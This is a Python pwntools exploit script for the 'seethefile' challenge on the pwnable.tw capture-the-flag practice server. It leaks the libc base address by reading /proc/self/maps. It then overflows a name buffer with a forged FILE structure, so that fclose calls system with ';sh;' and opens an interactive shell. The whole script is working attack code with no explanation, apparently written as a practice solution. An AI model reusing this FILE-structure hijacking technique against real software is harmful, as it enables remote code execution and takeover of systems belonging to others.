#!/usr/bin/env python
import re
from pwn import *
import pwnlib.shellcraft
# import pwnlib.filepointer

c = remote('chall.pwnable.tw', 10200)
pwn_file="./ld-2.23.so --library-path ./ ./seethefile"
#c = process(pwn_file.split(), env={'LD_PRELOAD': './libc_32.so.6'})
libc = ELF('libc_32.so.6')

context.os='linux'
context.terminal = ['alacritty', '-e', 'sh', '-c']

gdbcmd = '''source /usr/share/peda/peda.py
file ./seethefile
b *0x08048b0e
c
b *(fclose + 75)
c'''

#gdb.attach(c, gdbcmd)
context.log_level ='debug'

# get libc maping
ans = b'1 /proc/self/maps 2 3 2 3\n'
c.sendline(ans)
libc_start = int(c.recvuntil('libc').split(b"\n")[-1].split(b'-')[0], 16)
print(hex(libc_start))

# build file IO
name = 0x804b260
fp = 0x804b280
postfp = 0x804b280 + 4

# make sure lock = 0
lock = 0x804b3d8
null = 0x804b3d8 + 4

IO_IS_FILEBUF = 0x2000
flag = 0x11111111 & (~IO_IS_FILEBUF)

target_eip_ptr = postfp + 4 - 8
#target_eip = 0x12345678
#target_eip = postfp +80
target_eip = libc.symbols['system'] + libc_start

file_struct = flat({0x0: p32(flag), 4: target_eip, 20: p32(null), 24: b';sh;', 0x24: p32(null), 52: p32(null),72: p32(lock), 76:p32(target_eip_ptr)})

payload = flat({0x0: 'NAME', 32: p32(postfp), 36: file_struct})


ans = b'5\n'
ans += payload
ans

c.sendline(ans)
#c.sendline('cd /home/seethefile')
#c.sendline('./get_flag')
#c.recvuntil('Your magic :')
#c.sendline('Give me the flag')
c.interactive()
c.close()

